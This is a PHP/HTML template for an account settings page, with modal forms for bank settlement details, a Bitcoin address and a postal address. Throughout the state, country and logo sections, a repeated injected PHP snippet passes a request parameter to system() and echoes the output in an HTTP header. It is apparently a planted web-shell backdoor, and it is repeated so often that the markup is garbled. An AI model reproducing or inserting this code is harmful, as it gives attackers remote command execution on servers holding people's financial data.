		  	</div>
	  		<div class="form-group">
			    <label class="col-sm-4 col-md-3 control-label">Bank Address</label>
			    <div class="col-sm-10 col-md-9">
<input class="form-control mark_empty" type="text" id="bank_address" name="bank_address"  placeholder="123 Bank Dr, Bank City, Anytown, Bank Country" value="<?=$form['bank_address'];?>" />
			    </div>
			</div>

	  	</div><!--/.address-->
</div><!--/.row-fluid-->
</div><!--/.form-body-->

</div><!--/.modal-body-->


<div class="form-footer"> 
<div class="col-md-offset-1 col-md-9">
<button type="submit" class="btn btn-success btn-lg" name="go_account" value="" /> Update <i class="fa fa-check"></i></button>
</div>
</div><!--/.form-footer--> 
</form>
</div><!--/.modal-content--> 
</div><!--/.modal-dialog-->
</div>
<!-- END .Modal-SETTLEMENT-ACCOUNT -->


<!-- BEGIN MODAL BTC ADDRESS -->
<div class="modal fade ModalBitcoinAddy" tabindex="-1" role="dialog" aria-hidden="true" style="display: none;">
                <div class="modal-dialog modal-sm">
                    <div class="modal-content">
                        <div class="modal-header">
                            <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
                            <h4 class="modal-title">Update Bitcoin Address</h4>
                        </div>
                        <div class="modal-body no-padding">
						
<form class="form-horizontal form-bordered" id="form_account" method="post" enctype="multipart/form-data" action="<?=site_url($form_action);?>" role="form">
                                <div class="form-body">
                                    <div class="form-group">
                                        <label for="firstname-1" class="col-sm-3 control-label">Address</label>
                                        <div class="col-sm-7">
                                    	<input type="text" class="form-control" name="bitcoin_address" id="bitcoin_address" value="<?=$form['bitcoin_address'];?>" />
                                        </div>
                                    </div><!-- /.form-group -->
                                  
                                </div><!-- /.form-body -->
                                <div class="form-footer">
                                    <div class="col-sm-10 col-sm-offset-1">
										<button type="submit" class="btn btn-success btn-lg margin-bottom-20" name="go_account" value="" /> Update Address <i class="fa fa-check"></i></button>
                                    </div>
                                </div><!-- /.form-footer -->
                            </form>
                        </div>

                    </div><!-- /.modal-content -->
                </div><!-- /.modal-dialog -->
            </div>
<!-- END .Modal-BTC-ADDRESS -->

<!-- BEGIN MODAL-ADDRESS-->		
<div class="modal fade ModalAddressInfo" tabindex="-1" role="dialog" aria-hidden="true" style="display: none;">
<div class="modal-dialog modal-lg">
<div class="modal-content"> 
<div class="modal-header"> <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button> 
<h1 class="modal-title">Your Address Information.</h1> </div> 

<div class="modal-body"> 

<form class="form-horizontal" id="form_account" method="post" enctype="multipart/form-data" action="<?=site_url($form_action);?>">
<div>

  <!-- Nav tabs -->
  <ul class="nav nav-tabs" role="tablist">
    <li role="presentation" class="active"><a href="#home" aria-controls="home" role="tab" data-toggle="tab">Home</a></li>
    <li role="presentation"><a href="#business-addy" aria-controls="business-addy" role="tab" data-toggle="tab">Business</a></li>
  </ul>

  <!-- Tab panes -->
  <div class="tab-content">
    <div role="tabpanel" class="tab-pane active" id="home">
<div class="form-body well">

<div class="row">
<div class="form-group"> 
					<label class="col-sm-4 col-md-3 control-label" for="address_1">
Address
						<small class="text-warning"></small>
					</label>
<div class="col-md-9"> 
					<div class="input-group">
					<span class="input-group-addon">
					<i class="ace-icon fa fa-building"></i>
					</span>
			<input type="text" class="form-control required" name="address_1" id="address_1" value="<?=$form['address_1'];?>" />
                                        </div>
</div> <!-- END .col-md-9-->
</div> <!-- END .form-group-->
</div> <!-- END .ROW-->

<div class="row">
<div class="form-group"> 
					<label class="col-sm-4 col-md-3 control-label" for="address_2">
Address 2
						<small class="text-warning"></small>
					</label>
<div class="col-md-9"> 
					<div class="input-group">
					<span class="input-group-addon">
					<i class="ace-icon fa fa-building"></i>
					</span>
			<input type="text" class="form-control" name="address_2" id="address_2" value="<?=$form['address_2'];?>" />
                                        </div>
</div> <!-- END .col-md-9-->
</div> <!-- END .form-group-->
</div> <!-- END .ROW-->

<div class="row">
<div class="form-group"> 
					<label class="col-sm-4 col-md-3 control-label" for="city">
City
						<small class="text-warning"></small>
					</label>
<div class="col-md-9"> 
					<div class="input-group">
					<span class="input-group-addon">
						<i class="ace-icon fa fa-globe"></i>
					</span>
<input type="text" class="form-control required" name="city" id="city" value="<?=$form['city'];?>" geoname="locality" />
                                        </div>
</div> <!-- END .col-md-9-->
</div> <!-- END .form-group-->
</div> <!-- END .ROW-->

<div class="row">
<div class="form-group"> 
					<label class="col-sm-4 col-md-3 control-label" for="state">
State
						<small class="text-warning"></small>
					</label>
<div class="col-md-9"> 
					<div class="input-group">
					<span class="input-group-addon">
					<i class="ace-icon fa fa-building"></i>
					</span>
			<input geoname="administrative_area_level_1" type="text" class="text" name="state" id="state" value="<?=$form['state'];?>" />
			<select geoname="administrative_area_level_1_short" id="state_select" class="form-control" name="state_select"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
			foreach ($states as $state) {
				if ($form['state'] == $state['code']) { ?>
					<option  selected="selected"  value="<?=$state['code'];?>"><?=$state['name'];?></option><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
				} else { ?>
					<option value="<?=$state['code'];?>"><?=$state['name'];?></option><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
				}
			} ?></select>
                                        </div>
</div> <!-- END .col-md-9-->
</div> <!-- END .form-group-->
</div> <!-- END .ROW-->
<div class="row">
<div class="form-group"> 
					<label class="col-sm-4 col-md-3 control-label" for="postal_code">
Zip/ Postal
						<small class="text-warning"></small>
					</label>
<div class="col-md-9"> 
					<div class="input-group">
					<span class="input-group-addon">
					<i class="ace-icon fa fa-building"></i>
					</span>
		
			<input geoname="postal_code" type="text" class="form-control required" name="postal_code" id="postal_code" value="<?=$form['postal_code'];?>" />
                                        </div>
</div> <!-- END .col-md-9-->
</div> <!-- END .form-group-->
</div> <!-- END .ROW-->

<div class="row">
<div class="form-group"> 
					<label class="col-sm-4 col-md-3 control-label" for="country">
Country
						<small class="text-warning"></small>
					</label>
<div class="col-md-9"> 
					<div class="input-group">
					<span class="input-group-addon">
					<i class="ace-icon fa fa-globe"></i>
					</span>
			<select id="country" name="country" class="form-control required" geoname="country"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
			foreach ($countries as $country) {
				if ($form['country'] == $country['iso2']) { ?>
					<option  selected="selected" geoname="country"  value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $country['iso2'];?>" ><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $country['name'];?></option><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
				} else { ?>
					<option><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $country['name']; ?></option><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
				}
			} ?></select>
                                        </div>
</div> <!-- END .col-md-9-->
</div> <!-- END .form-group-->
</div> <!-- END .ROW-->


  </div><!-- END .form-body -->

</div><!-- END .tab -->
  </div><!-- END .tab-content -->
</div> <!-- END .MODAL-BODY-->

<div class="modal-footer"> 
<div class="form-actions center submit col-md-offset-2 col-md-6">
&nbsp;
<button type="submit" class="btn btn-success btn-lg" name="go_account" value="" /> Change <i class="fa fa-check"></i></button>
&nbsp;
</form>

</div>
</div> <!-- END .MODAL-FOOTER-->

</div> <!-- END .MODAL-CONTENT-->
</div> <!-- END .MODAL-DIALOG-->
</div>
<!-- END .MODAL-ADDRESS-->





<!-- BEGIN MODAL-NewAccount -->
<div class="modal fade" id="NewAccountModal" aria-hidden="true" style="display: none;"> 
<div class="modal-dialog"> 
<div class="modal-content"> 
<div class="modal-header"> <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button> 
<h4 class="modal-title">Create A New Account</h4> </div> 
<div class="modal-body"> 

<form class="form-horizontal" id="form_account" method="post" enctype="multipart/form-data" action="<?=site_url($form_action);?>">

<div class="form-body well">
  <input type="hidden" value="" name="id"/> 
<div class="row"> 

<div class="col-md-6"> 
<label for="email" class="control-label"> Email Address
						<small class="text-warning"></small>
					</label> 
<div class="input-group">
					<span class="input-group-addon">
					<i class="ace-icon fa fa-envelope"></i>
					</span>
<input type="text" autocomplete="off" class="form-control required email mark_empty" rel="email@example.com" id="email" name="email" value="<?=$form['email'];?>" />
					</div>
<div class="help">add a new user account</div>
</div> 

	</div>
</div> 

</div> 

<div class="modal-footer"> 
<div class="form-actions center submit col-md-offset-2 col-md-6">
<button type="button" class="btn btn-white btn-lg" data-dismiss="modal">Close <i class="fa fa-times"></i></button> 
&nbsp;
&nbsp;
<button type="submit" class="btn btn-success btn-lg" name="go_account" value="" /> Update <i class="fa fa-check"></i></button>
</div>
</form>
</div> 

</div> 

</div> 
</div>
<!-- END .modal-NewAccount-->


<div class="modal fade Settlement-Account" tabindex="-1" role="dialog" aria-hidden="true" style="display: none;">
  <div class="modal-dialog">
    <div class="modal-content">

        <div class="modal-header">
            <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
            <h1 class="modal-title">Change Your Deposit Information</h1>
        </div>
 <div class="modal-body">
 <form class="form-horizontal form-bordered"  id="form_account" method="post" action="<?=site_url($form_action);?>" role="form">
   <input type="hidden" value="" name="id"/> 
 		 <div class="form-group">
 			
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $logo=$form['company_logo'];
			if($logo!=""){ ?>
			<img src="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo site_url();?>/upload/<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $form['company_logo'];?>" height="80" width="80"/>
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } else{?>
             <img src="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo site_url();?>/upload/avatar.png" height="128" width="128"/>
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); }?>
			<input type="file" class="text" id="company_logo" name="company_logo"  />
			</div>
 						 <div class="form-group hidden">					
<label for="name" class="col-sm-3 control-label">company:</label>												
<input class="form-control input-sm hidden" value="<?=$form['company'];?>">
</div><!-- END/.profile-info-row-->	
						 <div class="form-group hidden">
			<label for="name" class="col-sm-3 control-label">Name</label>
	       <input class="form-control input-sm hidden" value="<?=$form['username'];?>" />
			  </div><!-- /.form-group -->
			  
<div class="profile-info-row">					
<div class="profile-info-name"><span>Bank Name:</span></div>												
<div class="profile-info-value"><span><?=$form['bank_name'];?></span></div>
</div><!-- END/.profile-info-row-->	

<div class="profile-info-row">
<div class="profile-info-name"><span>Bank Address:</span> </div>
<div class="profile-info-value"><span><?=$form['bank_address'];?></span></div>
</div><!-- END/.profile-info-row-->	
						

<div class="profile-info-row">
<div class="profile-info-name"><span>Account Name:</span> </div>
<div class="profile-info-value"><span><?=$form['bank_acc_name'];?></span></div>
</div><!-- END/.profile-info-row-->	
								
<div class="profile-info-row">
<div class="profile-info-name"><span>Account Type:</span> </div>
<div class="profile-info-value"><span><?=$form['bank_acc_type'];?> </span></div>
</div><!-- END/.profile-info-row-->	

<div class="profile-info-row">
<div class="profile-info-name"><span>Routing #:</span> </div>
<div class="profile-info-value"> <span><?= $this->user->Get('bank_routing_number') ?></span></div>
</div><!-- END/.profile-info-row-->										

<div class="profile-info-row">
<div class="profile-info-name"><span>Account #:</span> </div>
<div class="profile-info-value"> <span><?= $this->user->Get('bank_acc_number') ?></span></div><!-- END/.profile-value-->
</div><!-- END/.profile-info-row-->

<div class="profile-info-row">
<div class="profile-info-name"><span>Bank Swift:</span> </div>
<div class="profile-info-value"><span><?=$form['bank_swift_number'];?></span></div>
</div><!-- END/.profile-info-row-->
<hr>
<div class="profile-info-row"> 
<div class="profile-info-name"><span>BTC Address:</span> <button type="button" class="btn-link btn-xs pull-right" data-toggle="modal" data-target="#modal-bitcoin-address">
  Change Bitcoin Address
</button></div>
<div class="profile-info-value"><span><?=$form['bitcoin_address'];?></span> </div>
</div><!-- END/.profile-info-row-->
            </div>
			
            <div class="form-footer">
				<button type="submit" name="go_account" class="ladda-button btn-block" data-color="blue" data-style="expand-right"><span class="ladda-label">Save </span><span class="ladda-spinner"></span>
			<div class="ladda-progress" style="width: 164px;"></div>
				</button>
            </div>

</form>
    </div>
  </div>
</div><!-- /.modal -->



<script>


</script>
<!-- END MODALS -->

<script src="https://maps.googleapis.com/maps/api/js?sensor=false&amp;libraries=places"></script>

  <script>

    $("#phone").intlTelInput({
    initialCountry: "auto",
  geoIpLookup: function(callback) {
    $.get('http://ipinfo.io', function() {}, "jsonp").always(function(resp) {
      var countryCode = (resp && resp.country) ? resp.country : "";
      callback(countryCode);
    });
  },
      utilsScript: "../js/utils.js"
    });
  </script>
  
  <script type="text/javascript">
   jQuery(document).ready(function() {
     $("time.timeago").timeago();
   });
</script>